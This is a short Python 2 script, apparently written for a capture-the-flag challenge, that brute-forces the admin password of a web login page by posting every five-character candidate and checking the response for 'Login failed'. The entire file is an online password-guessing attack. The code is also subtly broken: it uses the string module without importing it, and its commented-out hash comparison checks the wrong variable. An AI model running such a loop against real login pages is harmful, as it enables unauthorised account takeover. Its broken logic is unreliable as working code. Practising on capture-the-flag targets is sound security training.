#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-08-12 18:13:34
# @Last Modified by:   john
# @Last Modified time: 2016-08-12 19:07:34

import requests
import hashlib

h = 'c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a'

sha256 = hashlib.sha256()

url = 'http://kitty.vuln.icec.tf/login.php'

s = requests.Session()


# uppers = permutations(string.ascii_uppercase,1)
# lowers = permutations(string.ascii_lowercase,1)
# digits1 = permutations(string.digits,)
# digits2 = permutations(string.digits,1)
# special_character = permutations("?%$@#^*()[];:")

uppers = string.ascii_uppercase
lowers = string.ascii_lowercase
digits = string.digits
special_characters = "?%$@#^*()[];:"

for upper in uppers:
	for lower in lowers:
		for digit1 in digits:
			for digit2 in digits:
				for sc in special_characters:
					p =  "".join( [ upper, lower, digit1, digit2, sc ] )
					#s.update(p)
					#n =  s.hexdigest()
					#print p, n
					r = s.post(url, data = {"username": "admin", "password": p})
					if "Login failed" in  r.text:
						print p, "fail"
					else:
						print "GOT A CATCH", p
						exit()

					#if n == s:
					#	print "WE GOT A WINNER", p 
					#	exit()